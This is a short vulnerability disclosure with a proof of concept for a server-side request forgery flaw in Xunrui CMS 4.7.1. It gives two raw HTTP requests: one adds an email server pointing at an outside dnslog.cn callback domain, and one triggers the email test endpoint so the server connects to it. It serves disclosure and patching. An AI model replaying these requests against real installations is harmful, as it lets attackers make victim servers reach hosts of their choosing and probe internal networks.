# xunruicms-email_test-SSRF

## Supplier

https://www.xunruicms.com/down/

## Description

Xunrui CMS system is to help customers promote their products, services and brands on the Internet, create value for customers and realize their own value! SSRF vulnerability exists

## POC

在系统-邮件设置-添加

In System - Email Settings - Add

![image-20251111154906248](\img\1.png)

红框里面得必填

Required fields in the red box

![image-20251111154906248](.\img\2.png)

![image-20251111154906248](.\img\4.png)

```
POST /admind45f74adbd95.php?c=email&m=add HTTP/1.1
Host: 192.168.24.65:1001
Content-Length: 175
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.24.65:1001
Referer: http://192.168.24.65:1001/admind45f74adbd95.php?c=email&m=index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: b4f32742f89d7240215e8f04897f609e_member_uid=1; b4f32742f89d7240215e8f04897f609e_member_cookie=ed9217d3ada4ebab1be5f3ac10e77505; csrf_cookie_name=a959c84b4e4760f8b8e859d2484a01b3; ci_session=0i6jdgloc2ksp66kidbkvgnhmofspo6r; PHPCMF548bfec3975944bdebbbf4113b3e44d3member_uid=1; PHPCMF548bfec3975944bdebbbf4113b3e44d3member_cookie=af9cad3bdafee2d64cb9869846ad27b3; laravel_session=8ntK1kqs5gVf4lPS7trycJXP48OfBiYIUFhwZF45
Connection: close

is_form=1&is_admin=1&is_tips=&_token=CMF548bfec&type=0&data%5Bhost%5D=m4zyp1.dnslog.cn&data%5Bport%5D=25&data%5Buser%5D=asdasdas&data%5Bpass%5D=******&data%5Bdisplayorder%5D=0
```

点击测试发送
Click to test and send

![image-20251111154906248](.\img\3.png)

![image-20251111154906248](.\img\5.png)

![image-20251111154906248](.\img\6.png)

```
GET /admind45f74adbd95.php?c=api&m=email_test&id=2&0.6983572944272666 HTTP/1.1
Host: 192.168.24.65:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.24.65:1001/admind45f74adbd95.php?c=email&m=index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: b4f32742f89d7240215e8f04897f609e_member_uid=1; b4f32742f89d7240215e8f04897f609e_member_cookie=ed9217d3ada4ebab1be5f3ac10e77505; csrf_cookie_name=a959c84b4e4760f8b8e859d2484a01b3; ci_session=0i6jdgloc2ksp66kidbkvgnhmofspo6r; PHPCMF548bfec3975944bdebbbf4113b3e44d3member_uid=1; PHPCMF548bfec3975944bdebbbf4113b3e44d3member_cookie=af9cad3bdafee2d64cb9869846ad27b3; laravel_session=8ntK1kqs5gVf4lPS7trycJXP48OfBiYIUFhwZF45
Connection: close
```

发现成果收到dnslog

Discovery results received dnslog

![image-20251111154906248](.\img\7.png)

## version

Vulnerabilities affect versions

| 迅睿CMS-Laravel版安装包     | 4.7.1 | 2025-11-11 |
| :-------------------------- | ----- | ---------- |
| 迅睿CMS-ThinkPHP版安装包    | 4.7.1 | 2025-11-11 |

| 迅睿CMS-CodeIgniter版安装包 | 4.7.1 | 2025-11-11 |
